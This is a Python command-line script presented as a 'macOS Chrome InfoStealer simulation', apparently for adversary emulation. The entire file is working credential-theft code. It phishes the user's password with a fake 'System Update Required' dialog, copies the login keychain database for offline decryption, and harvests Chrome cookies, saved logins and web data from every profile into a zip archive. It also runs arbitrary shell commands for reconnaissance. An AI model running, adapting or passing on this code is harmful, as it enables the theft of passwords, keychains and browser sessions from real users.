#!/usr/bin/env python3
"""
MacOS Chrome InfoStealer Simulation V3

This script simulates the extraction of sensitive information from macOS systems.
It provides comprehensive functionality for credential access and system reconnaissance found in most macOS infostealers:

1. User Password Acquisition:
   - Retrieves the user's password using osascript to display a fake system dialog
   - Simulates a common social engineering technique used by malware

2. Keychain Database Acquisition:
   - Copies the user's keychain database to memory
   - Reports the size of the copied keychain database

3. Chrome Credential Access:
   - Copies Chrome browser credential files (Cookies, Login Data, Web Data) to memory
   - Optionally zips the files and saves them to disk
   - Supports multiple Chrome profiles with detection and selection capabilities

4. System Information Gathering:
   - Executes system commands to gather information about the host
   - Provides hardware information using system_profiler
   - Supports custom command execution for targeted information gathering
"""

import argparse
import io
import logging
import os
import subprocess
import sys
import zipfile

# Configure logging for better error visibility
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


class ChromeProfileManager:
    """Manages Chrome profile detection and file operations."""

    @staticmethod
    def get_chrome_base_dir():
        """Returns the base Chrome directory on macOS."""
        return os.path.expanduser("~/Library/Application Support/Google/Chrome")

    @classmethod
    def list_available_profiles(cls):
        """Lists all available Chrome profiles on the system by scanning the directory."""
        base_dir = cls.get_chrome_base_dir()
        available_profiles = []

        try:
            # List all items in the Chrome directory
            for item in os.listdir(base_dir):
                item_path = os.path.join(base_dir, item)

                # Check if it's a directory
                if os.path.isdir(item_path):
                    # Verify it's a profile by checking for common files
                    for common_file in ["Cookies", "Login Data", "Web Data"]:
                        if os.path.exists(os.path.join(item_path, common_file)):
                            available_profiles.append(item)
                            break

            logger.info(
                f"Found {len(available_profiles)} Chrome profiles: {', '.join(available_profiles)}"
            )
            return available_profiles
        except Exception as e:
            logger.error(f"Error listing Chrome profiles: {e}")
            return ["Default"]  # Fallback to Default profile if error occurs

    @classmethod
    def get_profile_path(cls, profile_name):
        """Gets the full path for a specific Chrome profile."""
        return os.path.join(cls.get_chrome_base_dir(), profile_name)


def chrome_dir(profile="Default"):
    """
    Returns the Google Chrome configuration directory for a specific profile on macOS.

    Args:
        profile (str): The Chrome profile name (default: "Default")

    Returns:
        str: The path to the Chrome profile directory
    """
    return ChromeProfileManager.get_profile_path(profile)


def get_user_password_osascript(
    prompt_title="System Update Required",
    prompt_text="macOS needs your password to complete a system update.",
):
    """
    Retrieves the user's password using osascript to display a fake system dialog.
    This simulates a common social engineering technique used by malware.

    NOTE: In v4, this will be replaced with a native implementation.

    Args:
        prompt_title (str): The title to display in the dialog
        prompt_text (str): The text to display in the dialog

    Returns:
        str or None: Returns the user's password if successful, or None if an error occurs.
    """
    try:
        # Construct the AppleScript command
        applescript = f'''
        display dialog "{prompt_text}" with title "{prompt_title}" default answer "" with icon caution buttons {{"Continue"}} default button "Continue" with hidden answer
        set user_password to text returned of result
        return user_password
        '''

        # Execute the AppleScript command
        logger.info(f"Displaying password prompt with title: {prompt_title}")
        result = subprocess.run(
            ["osascript", "-e", applescript],
            capture_output=True,
            text=True,
            check=False,
        )

        # Check if the command was successful
        if result.returncode == 0 and result.stdout.strip():
            password = result.stdout.strip()
            logger.info("User password successfully retrieved via dialog.")
            # Mask the password in logs
            masked_length = len(password)
            logger.debug(f"Password length: {masked_length} characters")
            return password
        else:
            if result.returncode != 0:
                logger.error(
                    f"Failed to retrieve user password. Return code: {result.returncode}"
                )
                if result.stderr:
                    logger.error(f"Error message: {result.stderr}")
            else:
                logger.error("User did not enter a password or closed the dialog.")
            return None
    except Exception as e:
        logger.error(f"Error retrieving user password: {e}")
        return None


def copy_keychain_database():
    """
    Copies the user's keychain database to memory and reports its size.
    This enables offline decryption with tools like chainbreaker when combined with the user's password.

    Returns:
        tuple: (bytes, int) Returns the keychain database content as bytes and its size in bytes,
               or (None, 0) if an error occurs.
    """
    # Default keychain path
    keychain_path = os.path.expanduser("~/Library/Keychains/login.keychain-db")

    # Check if the default keychain exists, if not try the older format
    if not os.path.exists(keychain_path):
        keychain_path = os.path.expanduser("~/Library/Keychains/login.keychain")

    if not os.path.exists(keychain_path):
        logger.error("Could not find user's keychain database.")
        return None, 0

    try:
        logger.info(f"Attempting to copy keychain database from: {keychain_path}")

        # Read the keychain database into memory
        with open(keychain_path, "rb") as f:
            keychain_data = f.read()

        # Get the size of the keychain database
        keychain_size = len(keychain_data)
        logger.info(
            f"Successfully copied keychain database. Size: {keychain_size} bytes"
        )

        return keychain_data, keychain_size
    except PermissionError:
        logger.error(
            f"Permission denied when trying to access keychain at {keychain_path}"
        )
        return None, 0
    except Exception as e:
        logger.error(f"Error copying keychain database: {e}")
        return None, 0


def copy_chrome_files(wtd=False, profile="Default", output_file=None):
    """
    Copies Chrome files into memory, prints the size of each file,
    zips them in memory, prints the size of the zip file,
    and writes the zip file to disk if `wtd` is True.

    Args:
        wtd (bool): If True, writes the zip file to disk in the current working directory.
                    If False, only stores the zip in memory and returns None.
        profile (str): The Chrome profile name to extract files from (default: "Default")
        output_file (str, optional): Custom filename for the output zip file

    Returns:
        tuple: (str or None, bytes or None)
               First element: file path of the saved zip file if `wtd` is True, otherwise None.
               Second element: zip file content as bytes if successful, otherwise None.
    """
    chrome_files = ["Cookies", "Login Data", "Web Data"]
    zip_buffer = io.BytesIO()
    profile_dir = chrome_dir(profile)

    if not os.path.exists(profile_dir):
        logger.error(f"Chrome profile directory not found: {profile_dir}")
        return None, None

    logger.info(f"Copying Chrome files from profile: {profile}")

    try:
        # Open a ZipFile object to write files to the in-memory buffer
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
            for file_name in chrome_files:
                src_file = os.path.join(profile_dir, file_name)
                try:
                    if os.path.exists(src_file):
                        # Read file content to memory and log the size
                        with open(src_file, "rb") as f:
                            file_data = f.read()
                            file_size = len(file_data)
                            logger.info(f"Read {file_name}: {file_size} bytes")
                            zip_file.writestr(f"{profile}/{file_name}", file_data)
                    else:
                        logger.warning(
                            f"{file_name} not found in Chrome profile {profile}."
                        )
                except IOError as io_err:
                    logger.error(f"Error reading {file_name}: {io_err}")
                except Exception as e:
                    logger.error(f"Unexpected error while processing {file_name}: {e}")

        # Calculate size of the zip in memory and log it
        zip_size = zip_buffer.tell()
        logger.info(f"Size of zipped Chrome files in memory: {zip_size} bytes")

        # Get the zip content
        zip_buffer.seek(0)
        zip_content = zip_buffer.getvalue()

        # Write the zip file to disk if `wtd` is True
        if wtd:
            zip_buffer.seek(0)  # Reset the buffer position to the beginning
            if output_file:
                zip_file_path = os.path.join(os.getcwd(), output_file)
            else:
                zip_file_path = os.path.join(
                    os.getcwd(), f"chrome_files_{profile.lower()}.zip"
                )
            try:
                with open(zip_file_path, "wb") as f:
                    f.write(zip_buffer.read())
                logger.info(f"Zipped Chrome files saved to {zip_file_path}")
                return os.path.abspath(
                    zip_file_path
                ), zip_content  # Return the absolute path and content
            except IOError as io_err:
                logger.error(f"Error writing zip file to disk: {io_err}")
                return None, zip_content
            except Exception as e:
                logger.error(f"Unexpected error while saving zip file: {e}")
                return None, zip_content
        else:
            logger.info("Zip file not written to disk as 'wtd' is set to False.")
            return None, zip_content

    except zipfile.BadZipFile as bz_err:
        logger.error(f"Failed to create zip in memory: {bz_err}")
        return None, None
    except Exception as e:
        logger.error(f"Unexpected error during in-memory zip creation: {e}")
        return None, None


def run_system_commands(commands):
    """
    Executes a list of system commands and displays their output.

    Args:
        commands: List of strings, each containing a system command to run
    """
    if not commands:
        logger.warning("No commands provided to run_system_commands")
        return

    for cmd in commands:
        logger.info(f"Executing command: {cmd}")
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                text=True,
                capture_output=True,
                check=False,  # Don't raise exception on non-zero exit
            )

            if result.stdout:
                logger.info(f"Command output:\n{result.stdout.strip()}")

            if result.stderr:
                logger.warning(f"Command error output:\n{result.stderr.strip()}")

            if result.returncode != 0:
                logger.warning(
                    f"Command exited with non-zero status: {result.returncode}"
                )

        except Exception as e:
            logger.error(f"Error executing command '{cmd}': {e}")


def parse_arguments():
    """
    Parse command-line arguments.

    Returns:
        argparse.Namespace: The parsed command-line arguments
    """
    parser = argparse.ArgumentParser(
        description="MacOS Chrome InfoStealer Simulation V3",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # User password and keychain acquisition
  python main.py --getPassword --getKeychain

  # Chrome credential access
  python main.py --getPassword --getKeychain --memCopy
  python main.py --getPassword --getKeychain --diskCopy --profile "Profile 1"
  python main.py --listProfiles
  python main.py --getPassword --getKeychain --allProfiles --memCopy

  # System information gathering
  python main.py --systemInfo
  python main.py --systemInfo --commands "uname -a" "ifconfig" "ls -la ~"

  # Combined operations
  python main.py --getPassword --getKeychain --memCopy --systemInfo --verbose
  python main.py --getPassword --getKeychain --allProfiles --diskCopy --systemInfo
        """,
    )

    # Core functionality options
    parser.add_argument(
        "-p",
        "--getPassword",
        action="store_true",
        help="Retrieve user's password using a fake system dialog",
    )
    parser.add_argument(
        "-k",
        "--getKeychain",
        action="store_true",
        help="Copy the user's keychain database to memory",
    )
    parser.add_argument(
        "-d",
        "--diskCopy",
        action="store_true",
        help="Copy Chrome data files to disk",
    )
    parser.add_argument(
        "-m",
        "--memCopy",
        action="store_true",
        help="Copy Chrome data files to memory",
    )
    parser.add_argument(
        "-s",
        "--systemInfo",
        action="store_true",
        help="Run system information commands",
    )
    parser.add_argument(
        "-c",
        "--commands",
        nargs="+",
        help="Custom system commands to run (use with --systemInfo)",
    )

    # Profile options
    parser.add_argument(
        "-l",
        "--listProfiles",
        action="store_true",
        help="List available Chrome profiles",
    )
    parser.add_argument(
        "--profile", default="Default", help="Chrome profile to use (default: Default)"
    )
    parser.add_argument(
        "-a",
        "--allProfiles",
        action="store_true",
        help="Process all available Chrome profiles",
    )

    # Dialog customization options
    parser.add_argument(
        "--promptTitle",
        default="System Update Required",
        help="Title for the password prompt dialog (default: 'System Update Required')",
    )
    parser.add_argument(
        "--promptText",
        default="macOS needs your password to complete a system update.",
        help="Text for the password prompt dialog",
    )

    # Other options
    parser.add_argument(
        "-v", "--verbose", action="store_true", help="Enable verbose logging"
    )
    parser.add_argument(
        "-o",
        "--output",
        help="Specify output file name for disk copies (default: chrome_files_<profile>.zip)",
    )
    parser.add_argument(
        "--no-cleanup",
        action="store_true",
        help="Don't delete files after creating them (for --diskCopy)",
    )

    # Additional system information options
    parser.add_argument(
        "--network-info",
        action="store_true",
        help="Run network-related commands (ifconfig, netstat, etc.)",
    )
    parser.add_argument(
        "--user-info",
        action="store_true",
        help="Run user-related commands (whoami, id, groups, etc.)",
    )

    return parser.parse_args()


def main():
    """
    Main function that parses command-line arguments and executes the requested actions.
    """
    args = parse_arguments()

    # Configure logging level
    if args.verbose:
        logger.setLevel(logging.DEBUG)
        logger.debug("Verbose logging enabled")

    logger.info(
        f"Arguments received: getPassword={args.getPassword}, getKeychain={args.getKeychain}, "
        f"diskCopy={args.diskCopy}, memCopy={args.memCopy}, profile={args.profile}, "
        f"listProfiles={args.listProfiles}, allProfiles={args.allProfiles}"
    )

    # List available profiles if requested
    if args.listProfiles:
        profiles = ChromeProfileManager.list_available_profiles()
        if profiles:
            logger.info(f"Available Chrome profiles: {', '.join(profiles)}")
        else:
            logger.error("No Chrome profiles found")
        return

    # Determine which profiles to process
    profiles_to_process = []
    if args.allProfiles:
        profiles_to_process = ChromeProfileManager.list_available_profiles()
        if not profiles_to_process:
            logger.error("No Chrome profiles found")
            return
    else:
        profiles_to_process = [args.profile]

    # Check for conflicting options
    if args.diskCopy and args.memCopy:
        logger.error("Cannot use both --diskCopy and --memCopy at the same time.")
        sys.exit(1)

    # Run system commands if requested
    if args.systemInfo or args.network_info or args.user_info:
        commands = []

        if args.commands:
            commands.extend(args.commands)

        if args.systemInfo and not args.commands:
            commands.append("system_profiler SPHardwareDataType")

        if args.network_info:
            commands.extend(
                ["ifconfig", "netstat -rn", "networksetup -listallnetworkservices"]
            )

        if args.user_info:
            commands.extend(["whoami", "id", "groups", "last $(whoami) | head -5"])

        run_system_commands(commands)

    # Get user password if requested
    user_password = None
    if args.getPassword:
        user_password = get_user_password_osascript(args.promptTitle, args.promptText)
        if user_password:
            logger.info("User password successfully retrieved.")
        else:
            logger.warning("Failed to retrieve user password.")

    # Copy keychain database if requested
    keychain_data = None
    keychain_size = 0
    if args.getKeychain:
        keychain_data, keychain_size = copy_keychain_database()
        if keychain_data:
            logger.info(
                f"Keychain database successfully copied. Size: {keychain_size} bytes"
            )
        else:
            logger.error("Failed to copy keychain database.")

    # Process each Chrome profile
    chrome_data = {}
    for profile in profiles_to_process:
        logger.info(f"Processing Chrome profile: {profile}")

        # Copy Chrome files to disk if requested
        if args.diskCopy:
            file_path, zip_content = copy_chrome_files(
                wtd=True, profile=profile, output_file=args.output
            )
            if file_path:
                logger.info(f"Chrome files saved to: {file_path}")
                chrome_data[profile] = zip_content

                # Clean up the file after creating it (unless --no-cleanup is specified)
                if os.path.isfile(file_path) and not args.no_cleanup:
                    try:
                        os.remove(file_path)
                        logger.info(f"File {file_path} has been deleted.")
                    except Exception as e:
                        logger.error(f"Error deleting file {file_path}: {e}")
            else:
                logger.error(f"Failed to save Chrome files for profile {profile}.")

        # Copy Chrome files to memory if requested
        elif args.memCopy:
            _, zip_content = copy_chrome_files(wtd=False, profile=profile)
            if zip_content:
                logger.info(f"Chrome files from profile {profile} copied to memory.")
                chrome_data[profile] = zip_content
            else:
                logger.error(
                    f"Failed to copy Chrome files for profile {profile} to memory."
                )

    # Summary of collected data
    logger.info("\n=== Data Collection Summary ===")
    if user_password:
        logger.info("✓ User password: Successfully retrieved")
    else:
        logger.info("✗ User password: Not retrieved")

    if keychain_data:
        logger.info(f"✓ Keychain database: Successfully copied ({keychain_size} bytes)")
    else:
        logger.info("✗ Keychain database: Not copied")

    if chrome_data:
        logger.info(
            f"✓ Chrome data: Successfully copied for {len(chrome_data)} profile(s)"
        )
        for profile, data in chrome_data.items():
            logger.info(f"  - Profile '{profile}': {len(data)} bytes")
    else:
        logger.info("✗ Chrome data: Not copied")

    logger.info("===========================\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("Operation cancelled by user")
        sys.exit(130)
    except Exception as e:
        logger.critical(f"Unexpected error: {e}", exc_info=True)
        sys.exit(1)
